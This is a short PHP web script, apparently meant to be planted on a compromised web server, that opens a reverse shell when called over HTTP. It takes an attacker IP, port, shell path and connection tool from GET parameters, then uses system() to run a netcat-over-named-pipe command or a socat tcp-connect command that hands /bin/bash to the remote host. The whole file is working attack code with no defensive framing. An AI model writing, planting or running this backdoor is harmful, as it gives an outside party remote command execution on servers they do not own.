<?php

/* access: http://hostname/connect.php?port=80&ip=1.1.1.1&shell=/bin/bash&connect=nc */
error_reporting(-1);

$ip = $_GET['ip'];
$shell = $_GET['shell'];
$port = intval($_GET['port']);
$connect = $_GET['connect'] == 'netcat' ? 'nc' : $_GET['connect'];
$info = (bool)$_GET['info'];
$pipe = "pipe-${port}";

if ($info) {
  echo "Atacker's IP  : ${ip}\n";
  echo "Atacker's Port: ${port}\n";
  echo "Shell         : ${shell}\n";
  echo "Connect Via   : ${connect}\n";
}

try {
  if (is_null($ip) || is_null($port) || is_null($shell)) {
    throw new Exception("you must specify correct parameters ip:${ip}, port:${port}, shell:${shell}");
  }

  if (!file_exists($shell) || !is_executable($shell)) {
    throw new Exception("path may be wrong: ${shell}");
  }
  if (($port < 1) or ($port > 65535)) {
    throw new Exception("port: $port is illegal");
  }

  if ($connect !== 'nc' && $connect !== 'socat') {
    throw new Exception("illegal connection type ${connect}");
  }

$SHELL_CODE_NC = <<< EOF
export PATH=\$HOME:\$PATH
mkfifo ${pipe}
nc ${ip} ${port} 0<${pipe} 2>&1 | ${shell} 2>${pipe} 1>${pipe}
rm ./${pipe}
EOF;
  
$SHELL_CODE_SOCAT = <<< EOF
export PATH=\$HOME:\$PATH
socat tcp-connect:${ip}:${port} exec:${shell},pty,stderr,setsid,sigint,sane 
EOF;

  if ($info) exit();
  switch($connect) {
  case 'socat':
    system($SHELL_CODE_SOCAT);
    break;
  case 'nc':
    system($SHELL_CODE_NC);
    break;
  }
}
catch (Exception $e) {
  echo $e->getMessage();
}